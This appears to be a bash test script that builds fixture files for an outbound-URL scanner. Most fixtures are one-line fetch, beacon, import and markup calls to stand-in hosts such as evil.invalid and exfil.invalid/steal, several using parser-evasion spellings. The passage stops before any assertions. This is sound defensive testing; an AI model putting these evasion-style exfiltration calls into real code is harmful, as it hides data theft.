#!/usr/bin/env bash
# Regression fixtures for scan-egress.sh. Builds a throwaway tree with each class the review
# flagged and asserts the scanner's exit code + that the right paths are flagged. Exit 0 = all
# pass. Every class is exercised in ISOLATION so an assertion cannot be satisfied by a coupled
# violation (review finding: the old binary test passed only because other violations existed).
#
# NOTE: this control file assembles every fixture URL from fragments at runtime, so the SHIPPED
# source carries no literal `scheme://host`, no `curl|wget|fetch(` pipe, for the integrity
# manifest classifier to flag (finding #6: test fixtures must not poison the release path). The
# throwaway tree still receives real, scannable URLs; only this source is inert.
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SCAN="$HERE/scan-egress.sh"
pass=0; fail=0
ok(){ pass=$((pass+1)); printf '  ok    %s\n' "$1"; }
no(){ fail=$((fail+1)); printf '  FAIL  %s\n' "$1"; }

T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT

# assemble scheme + '://' from fragments so no literal URL token appears in THIS file
_s='ht'; _t='tp'; _x='s'; _sep=':'; _sl='/'
J="${_sep}${_sl}${_sl}"                                          # ://  (assembled)
url_https(){ printf '%s%s%s%s%s' "$_s" "$_t" "$_x" "$J" "$1"; }  # https://<host/path>
url_http(){  printf '%s%s%s%s'   "$_s" "$_t"       "$J" "$1"; }  # http://<host/path>

# --- build the fixtures (each class isolated in its own dir) ---
mkdir -p "$T/clean" "$T/waived" "$T/dirty" "$T/binonly" "$T/binembed" "$T/symonly" "$T/nlname"

# clean: no egress at all
printf '# docs\nnothing external here\n'                          > "$T/clean/readme.md"
printf 'body{color:red}\n'                                        > "$T/clean/style.css"
printf '<svg xmlns="%s"></svg>\n' "$(url_http www.w3.org/2000/svg)" > "$T/clean/icon.svg"   # non-fetching xmlns

# waived: a real egress with a bounded trailing waiver -> passes
printf 'const u="%s"; /* egress-ok */\n' "$(url_https api.example.invalid)" > "$T/waived/app.js"

# dirty: extensionless + UPPERCASE + symlink + binary + benign, all together
printf '#!/bin/sh\ndownload %s\n' "$(url_https evil.example.invalid/x)"   > "$T/dirty/deploy"   # extensionless
chmod +x "$T/dirty/deploy"
printf '#!/bin/sh\ndownload %s\n' "$(url_http 169.254.169.254/x)"         > "$T/dirty/RUN.SH"    # UPPERCASE ext
printf 'ok\n'                                                             > "$T/dirty/note.txt"
ln -s /etc/hosts "$T/dirty/link-out"                                                             # symlink escape
printf '\x7fELF\x01\x02\x03\x00\x00binary\x00\xff\xfe'                    > "$T/dirty/blob.bin"  # benign binary

# isolation: a benign binary ALONE (proves a binary fails closed on its own, and no set -u crash)
printf '\x7fELF\x00\x01\x02\xff\xfe'                                      > "$T/binonly/only.bin"
# isolation: a binary whose STRINGS embed a URL (proves scan-egress greps binary strings)
printf 'PRE\x00%s\x00POST\n' "$(url_https c2.example.invalid/beacon)"     > "$T/binembed/embed.bin"
# isolation: a symlink ALONE (proves symlink-only input does not crash under set -u)
ln -s /etc/hosts "$T/symonly/only-link"
# isolation: a filename CONTAINING A NEWLINE with an egress (proves NUL-safe find enumeration)
printf 'x %s\n' "$(url_https nl.example.invalid/x)"                       > "$T/nlname/we"$'\n'"ird.txt"

# --- 2.0.3 self-red-team fixtures (adversarial panel) ---
mkdir -p "$T/pr_srcset" "$T/pr_poster" "$T/pr_meta" "$T/laundry" "$T/webrtc" "$T/localok" "$T/fifo" "$T/binurl"
# protocol-relative //host in browser-auto-fetched contexts (bare '//', assembled to stay inert here).
# R6 finding #4: each vector gets its OWN isolated dir so one hit can never mask another.
_j="${_sep}${_sl}${_sl}"
printf '<img srcset="%scdn.evil.invalid/a.png 2x">\n' "${_sl}${_sl}"                 > "$T/pr_srcset/i.html"
printf '<video poster="%sposter.evil.invalid/f.jpg"></video>\n' "${_sl}${_sl}"       > "$T/pr_poster/i.html"
printf '<meta http-equiv="refresh" content="0;url=%smeta.evil.invalid/next">\n' "${_sl}${_sl}" > "$T/pr_meta/i.html"
# DOCTYPE-wrapped REAL url must NOT be laundered (the old <!DOCTYPE ...> strip ate it) -> must FAIL
printf 'var a="<!doctype"; var u="%s"; var b=">";\n' "$(url_https evil.invalid/steal)" > "$T/laundry/app.js"
# WebRTC stun: scheme (inert literal — no http prefix for the manifest classifier)
printf 'new RTCPeerConnection({iceServers:[{urls:"stun:stun.evil.invalid:3478"}]});\n' > "$T/webrtc/app.js"
# same-origin / data: fetch and a README that merely NAMES the APIs are BENIGN -> must PASS
printf 'fetch("./config.json"); new XMLHttpRequest(); fetch("data:text/plain,ok");\n' > "$T/localok/app.js"
printf '# Docs\nUses the fetch() API and XMLHttpRequest for local data.\n' > "$T/localok/README.md"
# a FIFO must fail closed and NEVER be read (reading it would hang the scanner)
mkfifo "$T/fifo/pipe" 2>/dev/null || true
printf 'ok\n' > "$T/fifo/ok.txt"
# a binary carrying an embedded URL must FAIL even when glob-waived (no laundering)
printf 'PRE\x00%s\x00POST\n' "$(url_https tracker.invalid/beacon)" > "$T/binurl/tracker.bin"

# --- 2.0.3-r4 fixtures (Codex round-3 exact-head), each class ISOLATED in its own dir ---
_pr="${_sl}${_sl}"                                              # protocol-relative '//' (assembled)
mkdir -p "$T/nsfetch" "$T/nsvar" "$T/nssvg" "$T/ppm" \
         "$T/objdata" "$T/beacon" "$T/xhropen" "$T/srcset2" "$T/leadws" "$T/mlattr" "$T/mlfetch" \
         "$T/unreadbin" "$T/travtree/sub/secret"
# finding 1: xmlns must NOT launder a real fetch/variable; only a genuine in-tag xmlns is benign
printf 'fetch(xmlns="%s")\n' "$(url_https exfil.invalid/x)"           > "$T/nsfetch/app.js"
printf 'const xmlns="%s"; fetch(xmlns)\n' "$(url_https exfil.invalid/y)" > "$T/nsvar/app.js"
printf '<svg xmlns="%s"></svg>\n' "$(url_http www.w3.org/2000/svg)"   > "$T/nssvg/icon.svg"
# finding 4: a NUL-free P6 Netpbm rawbits binary (control bytes, no NUL) must classify BINARY
{ printf 'P6\n2 2\n255\n'; printf '\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c'; } > "$T/ppm/img.ppm"
# finding 5: protocol-relative //host in each fetching context claimed by SKILL.md, isolated
printf '<object data="%sevil.invalid/x.swf"></object>\n' "$_pr"       > "$T/objdata/i.html"
printf 'navigator.sendBeacon("%sevil.invalid/b");\n' "$_pr"           > "$T/beacon/a.js"
printf 'var x=new XMLHttpRequest(); x.open("GET","%sevil.invalid/d");\n' "$_pr" > "$T/xhropen/a.js"
printf '<img srcset="%sa.invalid/1.png 1x, %sb.invalid/2.png 2x">\n' "$_pr" "$_pr" > "$T/srcset2/i.html"
mkdir -p "$T/srcset_a" "$T/srcset_b"                          # R6 #4: each candidate ALSO isolated alone
printf '<img srcset="%ssa.invalid/1.png 1x">\n' "$_pr"                > "$T/srcset_a/i.html"
printf '<img srcset="%ssb.invalid/2.png 2x">\n' "$_pr"                > "$T/srcset_b/i.html"
printf '<a href=" %sevil.invalid/lead">x</a>\n' "$_pr"               > "$T/leadws/i.html"
printf '<img\n  src\n  ="%sevil.invalid/ml">\n' "$_pr"               > "$T/mlattr/i.html"   # multiline attr
printf 'fetch(\n  "%sevil.invalid/mlf")\n' "$_pr"                    > "$T/mlfetch/a.js"    # multiline literal
# finding 2 & 3: unreadable file / traversal error fixtures (chmod applied at check time, root-skipped)
printf 'PRE\x00%s\x00POST\n' "$(url_https c2.invalid/x)"             > "$T/unreadbin/font.woff2"
printf 'clean docs\n'                                                > "$T/travtree/visible.txt"
printf 'download %s\n' "$(url_https evil.invalid/x)"                 > "$T/travtree/sub/secret/hidden.sh"

# --- 2.0.3-r5 fixtures (Codex round-4 exact-head), each class ISOLATED in its own dir ---
# shellcheck disable=SC1003  # not an escaped quote: exactly two literal backslash characters
_bs='\\'
mkdir -p "$T/latenul" "$T/ipv6" "$T/esmod" "$T/expfrom" "$T/btfetch" "$T/worker" "$T/swreg" \
         "$T/locnav" "$T/bslash" "$T/jsprop" "$T/fpsrc" "$T/fpdata" "$T/fpdiv"
# finding 1: text-classified file (first 8K printable) with a LATE NUL + real URL — the NUL must not
# be able to collapse the counts channel into a false PASS (counts ride a separate trusted file)
head -c 9000 /dev/zero | LC_ALL=C tr '\0' 'A'                        > "$T/latenul/late.js"
printf '\000%s\n' "$(url_https exfil.invalid/steal)"                >> "$T/latenul/late.js"
# finding 7: each direct-miss vector isolated
printf '<img src="%s[2001:db8::1]/x.png">\n' "$_pr"                  > "$T/ipv6/i.html"      # IPv6 literal host
printf 'import x from "%sevil.invalid/mod.js";\n' "$_pr"             > "$T/esmod/a.js"       # static import
printf 'export { a } from "%sevil.invalid/re.js";\n' "$_pr"          > "$T/expfrom/a.js"     # export-from
# shellcheck disable=SC2016  # the backticks are JS template-literal SYNTAX and must stay literal
printf 'fetch(`%sevil.invalid/bt`);\n' "$_pr"                        > "$T/btfetch/a.js"     # backtick template
printf 'new Worker("%sevil.invalid/w.js");\n' "$_pr"                 > "$T/worker/a.js"      # dedicated worker
printf 'navigator.serviceWorker.register("%sevil.invalid/sw.js");\n' "$_pr" > "$T/swreg/a.js"
printf 'location.assign("%sevil.invalid/nav");\n' "$_pr"             > "$T/locnav/a.js"
printf '<a href="%s%s%s%s%sevil.invalid/bs">x</a>\n' "$_s" "$_t" "$_x" "$_sep" "$_bs" > "$T/bslash/i.html"  # https:\\host
# tag-bounding must NOT lose the JS property-assignment vector (dot-prefixed .src=)
printf 'img.src = "%sevil.invalid/js";\n' "$_pr"                     > "$T/jsprop/a.js"
# finding 8: material false positives — plain JS vars and a non-fetching div data attribute
printf "const src='%sdocs';\n" "$_pr"                                > "$T/fpsrc/a.js"
printf "const data='%sdocs';\n" "$_pr"                               > "$T/fpdata/a.js"
printf "<div data='%sdocs'>x</div>\n" "$_pr"                         > "$T/fpdiv/i.html"
# nearby FP found while red-teaming: BOTH xmlns declarations in one tag are benign namespaces
mkdir -p "$T/ns2"
printf '<svg xmlns="%s" xmlns:xlink="%s"></svg>\n' \
  "$(url_http www.w3.org/2000/svg)" "$(url_http www.w3.org/1999/xlink)" > "$T/ns2/i.svg"

# --- 2.0.3-r6 fixtures (Codex round-5 exact-head), each class ISOLATED ---
# finding S2: valid COMPACT ES modules (no whitespace after the keyword) must be caught
mkdir -p "$T/r6imp" "$T/r6exp" "$T/r6star" "$T/r6bare" "$T/r6konst"
printf 'import{a}from"%sevil.invalid/m"\n' "$_pr"                     > "$T/r6imp/a.js"     # import{a}from
printf 'export{a}from"%sevil.invalid/m"\n' "$_pr"                     > "$T/r6exp/a.js"     # export{a}from
printf 'import*as n from"%sevil.invalid/m"\n' "$_pr"                  > "$T/r6star/a.js"    # import*as
printf 'import"%sevil.invalid/side"\n' "$_pr"                         > "$T/r6bare/a.js"    # bare import"//h"
printf 'export const x = "%sdocs";\n' "$_pr"                          > "$T/r6konst/a.js"   # string const, NOT a fetch
# finding S3: a filename carrying an ESC + forged text must be sanitized in every diagnostic
mkdir -p "$T/r6esc"
ln -s /etc/hosts "$T/r6esc/$(printf 'evil\033[32mFORGED-PASS\033[0m')" 2>/dev/null || true

# --- 2.0.3-r7 fixtures (scanner attack-matrix), each class ISOLATED ---
# WHATWG network-path spellings: three slashes, mixed slash/backslash, percent-decoded host, and
# userinfo all resolve to an external authority. The percent-encoded slash control is an invalid
# host and must stay clean. `_bs` is two source backslashes (one runtime JS backslash).
mkdir -p "$T/r7triple" "$T/r7pcthost" "$T/r7userinfo0" "$T/r7userinfo1" \
         "$T/r7mix3" "$T/r7mix2" "$T/r7badpct" "$T/r7hyphenhost" \
         "$T/r7underhost" "$T/r7pctuserinfo"
printf 'fetch("%s%s%sevil.invalid/x")\n' "$_sl" "$_sl" "$_sl" > "$T/r7triple/a.js"
printf 'fetch("%s%s%%65vil.invalid/x")\n' "$_sl" "$_sl"       > "$T/r7pcthost/a.js"
printf 'fetch("%s%s@evil.invalid/x")\n' "$_sl" "$_sl"        > "$T/r7userinfo0/a.js"
printf 'fetch("%s%s:pw@evil.invalid/x")\n' "$_sl" "$_sl"     > "$T/r7userinfo1/a.js"
printf 'fetch("%s%s%sevil.invalid/x")\n' "$_sl" "$_sl" "$_bs" > "$T/r7mix3/a.js"
printf 'fetch("%s%sevil.invalid/x")\n' "$_sl" "$_bs"        > "$T/r7mix2/a.js"
printf 'fetch("%s%s%%2fevil.invalid/x")\n' "$_sl" "$_sl"     > "$T/r7badpct/a.js"
printf 'fetch("%s%s-evil.invalid/x")\n' "$_sl" "$_sl"       > "$T/r7hyphenhost/a.js"
printf 'fetch("%s%s_evil.invalid/x")\n' "$_sl" "$_sl"       > "$T/r7underhost/a.js"
printf 'fetch("%s%su%%2F:p@evil.invalid/x")\n' "$_sl" "$_sl" > "$T/r7pctuserinfo/a.js"

# HTML character references are decoded exactly once in fetching attributes. Each decoded output
# carries a raw-source offset so findings, line waivers, and two-candidate counts remain exact.
mkdir -p "$T/r7enthex" "$T/r7entdec" "$T/r7entnamed" "$T/r7entabs" \
         "$T/r7entsrcset" "$T/r7entmeta" "$T/r7entcss" "$T/r7enttitle" \
         "$T/r7entdouble" "$T/r7entjs" "$T/r7escaped" "$T/r7entwaive"
printf '<img src="&#x2f;&#x2f;evil.invalid/x">\n'              > "$T/r7enthex/i.html"
printf '<img src="&#47;&#47;evil.invalid/x">\n'                  > "$T/r7entdec/i.html"
printf '<img src="&sol;&sol;evil.invalid/x">\n'                  > "$T/r7entnamed/i.html"
printf '<img src="https&colon;&sol;&sol;evil.invalid/x">\n'      > "$T/r7entabs/i.html"
printf '<img srcset="&sol;&sol;a.invalid/1.png 1x, &sol;&sol;b.invalid/2.png 2x">\n' > "$T/r7entsrcset/i.html"
printf '<meta http-equiv="refresh" content="0;url=&sol;&sol;evil.invalid/next">\n' > "$T/r7entmeta/i.html"
printf '<div style="background:url(&sol;&sol;evil.invalid/bg.png)"></div>\n' > "$T/r7entcss/i.html"
printf '<div title="&sol;&sol;docs.invalid/title">text</div>\n'  > "$T/r7enttitle/i.html"
printf '<img src="&amp;#47;&amp;#47;docs.invalid/not-network">\n' > "$T/r7entdouble/i.html"
printf '<script>fetch("&sol;&sol;docs.invalid/not-decoded")</script>\n' > "$T/r7entjs/i.html"
printf '&lt;img src=&quot;&sol;&sol;docs.invalid/not-markup&quot;&gt;\n' > "$T/r7escaped/i.html"
printf '<img src="&sol;&sol;reviewed.invalid/x"> /* egress-ok */\n' > "$T/r7entwaive/i.html"

# JS grammar: comments may surround tokens, but commented-out/code-shaped text is inert. Bracket
# location, window.open, and DOM attribute setters are fetching APIs; unrelated db.open/new URL are not.
mkdir -p "$T/r7fetchcomment" "$T/r7importcomment" "$T/r7exportcomment" "$T/r7importclause" \
         "$T/r7locbracket" "$T/r7windowopen" "$T/r7setsrc" "$T/r7sethrefns" \
         "$T/r7setsrcset" "$T/r7setaction" "$T/r7setformaction" "$T/r7linecomment" \
         "$T/r7blockcomment" "$T/r7htmlcomment" "$T/r7codestring" "$T/r7urlcomment" \
         "$T/r7plaintriple" "$T/r7newurl" "$T/r7dbopen" "$T/r7hashlocal" \
         "$T/r7cssurl" "$T/r7csscomment" "$T/r7prosescript" "$T/r7markwstring"
mkdir -p "$T/r7optional" "$T/r7bracketfetch" "$T/r7localdouble" "$T/r7jsmarkup" "$T/r7bodycode" \
         "$T/r7winloc" "$T/r7docloc" "$T/r7bracketloc" "$T/r7srcdoc"
mkdir -p "$T/r7ping2"
mkdir -p "$T/r7image2"
mkdir -p "$T/r7brackethref"
mkdir -p "$T/r7quotehost" "$T/r7banghost" "$T/r7unclosedscript" "$T/r7unclosedstyle" "$T/r7srcdocunclosed"
printf 'fetch/* audit */("%sevil.invalid/x")\n' "$_pr" > "$T/r7fetchcomment/a.js"
printf 'import/* audit */"%sevil.invalid/side.js"\n' "$_pr" > "$T/r7importcomment/a.js"
printf 'export/* a */{x}/* b */from/* c */"%sevil.invalid/mod.js"\n' "$_pr" > "$T/r7exportcomment/a.js"
printf 'import/* a */{x as y, z}/* b */from/* c */"%sevil.invalid/full.js"\n' "$_pr" > "$T/r7importclause/a.js"
printf 'location["href"]="%sevil.invalid/nav"\n' "$_pr" > "$T/r7locbracket/a.js"
printf 'window.open("%sevil.invalid/popup")\n' "$_pr" > "$T/r7windowopen/a.js"
printf 'document.querySelector("img").setAttribute("src","%sevil.invalid/i.png")\n' "$_pr" > "$T/r7setsrc/a.js"
printf 'node.setAttributeNS(null,"href","%sevil.invalid/x")\n' "$_pr" > "$T/r7sethrefns/a.js"
printf 'node.setAttribute("srcset","%sa.invalid/1.png 1x, %sb.invalid/2.png 2x")\n' "$_pr" "$_pr" > "$T/r7setsrcset/a.js"
printf 'form.setAttribute("action","%sevil.invalid/post")\n' "$_pr" > "$T/r7setaction/a.js"
printf 'button.setAttribute("formaction","%sevil.invalid/post")\n' "$_pr" > "$T/r7setformaction/a.js"
printf '// fetch("%sdocs.invalid/comment")\nconst x=1;\n' "$_pr" > "$T/r7linecomment/a.js"
printf '/* import "%sdocs.invalid/comment" */\nconst x=1;\n' "$_pr" > "$T/r7blockcomment/a.js"
printf '<!-- <img src="%sdocs.invalid/comment"> -->\n<p>ok</p>\n' "$_pr" > "$T/r7htmlcomment/i.html"
printf "const sample='fetch(\"%sdocs.invalid/example\")';\n" "$_pr" > "$T/r7codestring/a.js"
printf 'fetch("%sevil.invalid/a/*still-url*/b")\n' "$_pr" > "$T/r7urlcomment/a.js"
printf 'const docs="%s%s%sdocs";\n' "$_sl" "$_sl" "$_sl" > "$T/r7plaintriple/a.js"
printf 'const u=new URL("%sdocs.invalid/path", location.href);\n' "$_pr" > "$T/r7newurl/a.js"
printf 'db.open("%sdocs.invalid/database")\n' "$_pr" > "$T/r7dbopen/a.js"
printf '<a href="#part">x</a><img src="/local.png"><div title="%sdocs">t</div>\n' "$_pr" > "$T/r7hashlocal/i.html"
printf 'body{background:url(%sevil.invalid/bg.png)}\n' "$_pr" > "$T/r7cssurl/a.css"
printf '/* body{background:url(%sdocs.invalid/comment.png)} */\n' "$_pr" > "$T/r7csscomment/a.css"
printf "<p>don't mask this:</p><script>fetch(\"%sevil.invalid/live\")</script>\n" "$_pr" > "$T/r7prosescript/i.html"
printf "<script>const sample='<img src=\"%sdocs.invalid/example\">';</script>\n" "$_pr" > "$T/r7markwstring/i.html"
printf 'fetch?.("%sevil.invalid/optional")\n' "$_pr" > "$T/r7optional/a.js"
printf 'window["fetch"]("%sevil.invalid/bracket")\n' "$_pr" > "$T/r7bracketfetch/a.js"
printf 'fetch("/api/%ssame-origin/path")\n' "$_pr" > "$T/r7localdouble/a.js"
printf "const sample='<img src=\"%sdocs.invalid/example\">';\n" "$_pr" > "$T/r7jsmarkup/a.js"
printf '<p>Example: fetch("%sdocs.invalid/example")</p>\n' "$_pr" > "$T/r7bodycode/i.html"
printf 'window.location="%sevil.invalid/window"\n' "$_pr" > "$T/r7winloc/a.js"
printf 'document.location="%sevil.invalid/document"\n' "$_pr" > "$T/r7docloc/a.js"
printf 'window["location"]="%sevil.invalid/bracket-location"\n' "$_pr" > "$T/r7bracketloc/a.js"
printf '<iframe srcdoc="&lt;img src=&quot;%sevil.invalid/nested&quot;&gt;"></iframe>\n' "$_pr" > "$T/r7srcdoc/i.html"
printf '<a ping="%sa.invalid/p %sb.invalid/p">x</a>\n' "$_pr" "$_pr" > "$T/r7ping2/i.html"
printf 'body{background-image:image-set("%sa.invalid/1.png" 1x, "%sb.invalid/2.png" 2x)}\n' "$_pr" "$_pr" > "$T/r7image2/a.css"
printf 'window["location"]["href"]="%sevil.invalid/chained"\n' "$_pr" > "$T/r7brackethref/a.js"
printf 'fetch("%s\047evil.invalid/punct")\n' "$_pr" > "$T/r7quotehost/a.js"
printf 'fetch("%s!evil.invalid/punct")\n' "$_pr" > "$T/r7banghost/a.js"
printf '<script>fetch("%sevil.invalid/unclosed")\n' "$_pr" > "$T/r7unclosedscript/i.html"
printf '<style>body{background:url(%sevil.invalid/unclosed)}\n' "$_pr" > "$T/r7unclosedstyle/i.html"
printf '<iframe srcdoc="&lt;script&gt;fetch(&quot;%sevil.invalid/nested-unclosed&quot;)"></iframe>\n' "$_pr" > "$T/r7srcdocunclosed/i.html"

# --- 2.0.3-r8 fixtures (post-review parser boundaries), each class ISOLATED ---
# HTML tokenizer recovery: abrupt/end-bang comments and malformed-but-browser-closing raw-text end
# tags must expose the following active markup. The same comment states apply after srcdoc decoding.
mkdir -p "$T/r8commentabrupt" "$T/r8commentbang" "$T/r8srcdocabrupt" "$T/r8srcdocbang" \
         "$T/r8scriptattrs" "$T/r8styleslash" "$T/r8scriptcommentstring" \
         "$T/r8scriptlegacycomment" "$T/r8stylecommentstring" "$T/r8stylelegacycomment" \
         "$T/r8attrcommenttext" "$T/r8attrscripttext" "$T/r8unquotedattrcomment" \
         "$T/r8unquotedattrscript"
printf '<!--><img src="%sevil.invalid/abrupt">\n' "$_pr" > "$T/r8commentabrupt/i.html"
printf '<!-- audit --!><img src="%sevil.invalid/end-bang">\n' "$_pr" > "$T/r8commentbang/i.html"
printf '<iframe srcdoc="&lt;!--&gt;&lt;img src=&quot;%sevil.invalid/srcdoc-abrupt&quot;&gt;"></iframe>\n' \
  "$_pr" > "$T/r8srcdocabrupt/i.html"
printf '<iframe srcdoc="&lt;!-- audit --!&gt;&lt;img src=&quot;%sevil.invalid/srcdoc-bang&quot;&gt;"></iframe>\n' \
  "$_pr" > "$T/r8srcdocbang/i.html"
printf '<script>const local=1;</script foo><img src="%sevil.invalid/after-script">\n' \
  "$_pr" > "$T/r8scriptattrs/i.html"
printf '<style>body{color:red}</style/><img src="%sevil.invalid/after-style">\n' \
  "$_pr" > "$T/r8styleslash/i.html"
printf '<script>const marker="<!--";</script><img src="%sevil.invalid/after-marker">\n' \
  "$_pr" > "$T/r8scriptcommentstring/i.html"
printf '<script><!--\nfetch("%sevil.invalid/after-legacy-comment")\n--></script>\n' \
  "$_pr" > "$T/r8scriptlegacycomment/i.html"
printf '<style>i{--marker:"<!--"}</style><img src="%sevil.invalid/after-style-marker">\n' \
  "$_pr" > "$T/r8stylecommentstring/i.html"
printf '<style><!--\na{background:url(%sevil.invalid/after-style-comment)}\n--></style>\n' \
  "$_pr" > "$T/r8stylelegacycomment/i.html"
printf '<div title="<!--">label</div><img src="%sevil.invalid/after-attr-comment">\n' \
  "$_pr" > "$T/r8attrcommenttext/i.html"
printf '<div title="<script>">label</div><img src="%sevil.invalid/after-attr-script">\n' \
  "$_pr" > "$T/r8attrscripttext/i.html"
printf '<div title=<!--audit>label</div><img src="%sevil.invalid/after-unquoted-comment">\n' \
  "$_pr" > "$T/r8unquotedattrcomment/i.html"
printf '<div title=<script>>label</div><img src="%sevil.invalid/after-unquoted-script">\n' \
  "$_pr" > "$T/r8unquotedattrscript/i.html"

# JavaScript lexical boundaries: template substitutions are executable code; slash pairs inside a
# regex literal are not comments and therefore cannot mask a later real fetch call.
mkdir -p "$T/r8templateexpr" "$T/r8regexline" "$T/r8regexblock" \
         "$T/r8regexafterif" "$T/r8regexafterblock" "$T/r8regexawait" \
         "$T/r8regexspread" "$T/r8regexdefault" "$T/r8regexextends" \
         "$T/r8propdefaultdiv" "$T/r8propawaitdiv" "$T/r8functiondiv" \
         "$T/r8postincdiv" "$T/r8postdecdiv" "$T/r8regexdivisor" \
         "$T/r8nestedfunctionregex" "$T/r8labelregex" \
         "$T/r8regeximportasi" "$T/r8regexexportasi" "$T/r8regexbreakasi" \
         "$T/r8regexcontinueasi" "$T/r8regexexportclass" "$T/r8regexexportfunction" \
         "$T/r8regexexportdefaultfunction" "$T/r8regexcatchblock" \
         "$T/r8regextsinterface" "$T/r8regextsenum" "$T/r8regextsnamespace" \
         "$T/r8iflinecontrol" "$T/r8blockcommentcontrol"
# shellcheck disable=SC2016  # backticks/${...} are literal JavaScript template syntax
printf 'const result=`${fetch("%sevil.invalid/template")}`;\n' "$_pr" > "$T/r8templateexpr/a.js"
printf 'const slash=/[//]/; fetch("%sevil.invalid/after-regex-line");\n' "$_pr" > "$T/r8regexline/a.js"
printf 'const mark=/[/*]/; fetch("%sevil.invalid/after-regex-block");\n' "$_pr" > "$T/r8regexblock/a.js"
printf 'if (ok) /[//]/.test(x); fetch("%sevil.invalid/after-control-regex");\n' \
  "$_pr" > "$T/r8regexafterif/a.js"
printf '{} /[/*]/.test(x); fetch("%sevil.invalid/after-block-regex");\n' \
  "$_pr" > "$T/r8regexafterblock/a.js"
printf 'async function f(){ await /[//]/; fetch("%sevil.invalid/await"); }\n' \
  "$_pr" > "$T/r8regexawait/a.js"
printf 'const xs=[.../[/*]/, fetch("%sevil.invalid/spread")];\n' \
  "$_pr" > "$T/r8regexspread/a.js"
printf 'export default /[//]/; fetch("%sevil.invalid/default");\n' \
  "$_pr" > "$T/r8regexdefault/a.js"
printf 'class X extends /[/*]/.constructor {}; fetch("%sevil.invalid/extends");\n' \
  "$_pr" > "$T/r8regexextends/a.js"
printf 'const n=obj.default / 2; fetch("%sevil.invalid/property-default");\n' \
  "$_pr" > "$T/r8propdefaultdiv/a.js"
printf 'const n=obj.await / 2; fetch("%sevil.invalid/property-await");\n' \
  "$_pr" > "$T/r8propawaitdiv/a.js"
printf 'const f=function() {} / 2; fetch("%sevil.invalid/function-division");\n' \
  "$_pr" > "$T/r8functiondiv/a.js"
printf 'let n=1; n++ / 2; fetch("%sevil.invalid/post-increment");\n' \
  "$_pr" > "$T/r8postincdiv/a.js"
printf 'let n=1; n-- / 2; fetch("%sevil.invalid/post-decrement");\n' \
  "$_pr" > "$T/r8postdecdiv/a.js"
printf 'const n=x / /[//]/.test(y); fetch("%sevil.invalid/regex-divisor");\n' \
  "$_pr" > "$T/r8regexdivisor/a.js"
printf 'function f(x=g()) {} /[//]/.test(x); fetch("%sevil.invalid/function-decl");\n' \
  "$_pr" > "$T/r8nestedfunctionregex/a.js"
printf 'label: {} /[/*]/.test(x); fetch("%sevil.invalid/label-block");\n' \
  "$_pr" > "$T/r8labelregex/a.js"
printf 'import x from "./x"\n/[a//]/.test(x); fetch("%sevil.invalid/import-asi");\n' \
  "$_pr" > "$T/r8regeximportasi/a.mjs"
printf 'export {x}\n/[a//]/.test(x); fetch("%sevil.invalid/export-asi");\n' \
  "$_pr" > "$T/r8regexexportasi/a.mjs"
printf 'while(ok){ break\n/[a//]/.test(x); fetch("%sevil.invalid/break-asi"); }\n' \
  "$_pr" > "$T/r8regexbreakasi/a.js"
printf 'while(ok){ continue\n/[a/*]/.test(x); fetch("%sevil.invalid/continue-asi"); }\n' \
  "$_pr" > "$T/r8regexcontinueasi/a.js"
printf 'export default class LocalOnly {}\n/[a//]/.test(x); fetch("%sevil.invalid/export-class");\n' \
  "$_pr" > "$T/r8regexexportclass/a.mjs"
printf 'export function localOnly() {}\n/[a//]/.test(x); fetch("%sevil.invalid/export-function");\n' \
  "$_pr" > "$T/r8regexexportfunction/a.mjs"
printf 'export default function localOnly() {}\n/[a//]/.test(x); fetch("%sevil.invalid/export-default-function");\n' \
  "$_pr" > "$T/r8regexexportdefaultfunction/a.mjs"
printf 'try { localOnly(); } catch {}\n/[a//]/.test(x); fetch("%sevil.invalid/catch-block");\n' \
  "$_pr" > "$T/r8regexcatchblock/a.js"
printf 'interface X { value: string }\n/[a//]/.test(x); fetch("%sevil.invalid/ts-interface");\n' \
  "$_pr" > "$T/r8regextsinterface/a.ts"
printf 'enum X { A }\n/[a//]/.test(x); fetch("%sevil.invalid/ts-enum");\n' \
  "$_pr" > "$T/r8regextsenum/a.ts"
printf 'namespace X { export const value=1 }\n/[a//]/.test(x); fetch("%sevil.invalid/ts-namespace");\n' \
  "$_pr" > "$T/r8regextsnamespace/a.ts"
printf 'if (ok) // fetch("%sdocs.invalid/comment")\nconst local=1;\n' \
  "$_pr" > "$T/r8iflinecontrol/a.js"
printf '{} /* fetch("%sdocs.invalid/comment") */ const local=1;\n' \
  "$_pr" > "$T/r8blockcommentcontrol/a.js"

# WHATWG special schemes accept one or zero slashes before the host in a fetching context.
mkdir -p "$T/r8httpsone" "$T/r8httpszero" "$T/r8httpsonebin" "$T/r8httpszerobin" \
         "$T/r8httpshyphenbin" "$T/r8httpsunderbin" "$T/r8httpsbangbin"
printf 'fetch("%s%s%s%s%sevil.invalid/one")\n' "$_s" "$_t" "$_x" "$_sep" "$_sl" > "$T/r8httpsone/a.js"
printf 'fetch("%s%s%s%sevil.invalid/zero")\n' "$_s" "$_t" "$_x" "$_sep" > "$T/r8httpszero/a.js"
printf 'PRE\000%s%s%s%s%sevil.invalid/one\000POST\n' \
  "$_s" "$_t" "$_x" "$_sep" "$_sl" > "$T/r8httpsonebin/a.bin"
printf 'PRE\000%s%s%s%sevil.invalid/zero\000POST\n' \
  "$_s" "$_t" "$_x" "$_sep" > "$T/r8httpszerobin/a.bin"
printf 'PRE\000%s%s%s%s-evil.invalid/hyphen\000POST\n' \
  "$_s" "$_t" "$_x" "$_sep" > "$T/r8httpshyphenbin/a.bin"
printf 'PRE\000%s%s%s%s_evil.invalid/underscore\000POST\n' \
  "$_s" "$_t" "$_x" "$_sep" > "$T/r8httpsunderbin/a.bin"
printf 'PRE\000%s%s%s%s!evil.invalid/bang\000POST\n' \
  "$_s" "$_t" "$_x" "$_sep" > "$T/r8httpsbangbin/a.bin"

# Media policy: an explicit JS suffix keeps markup-shaped string bytes inert; HTML and unknown
# media are parsed conservatively so identical polyglot bytes cannot earn a false green.
mkdir -p "$T/r8polyhtml" "$T/r8polyjs" "$T/r8polyunknown"
printf "const sample='<img src=\"%sevil.invalid/polyglot\">';\n" "$_pr" > "$T/r8polyhtml/a.html"
printf "const sample='<img src=\"%sdocs.invalid/js-string\">';\n" "$_pr" > "$T/r8polyjs/a.js"
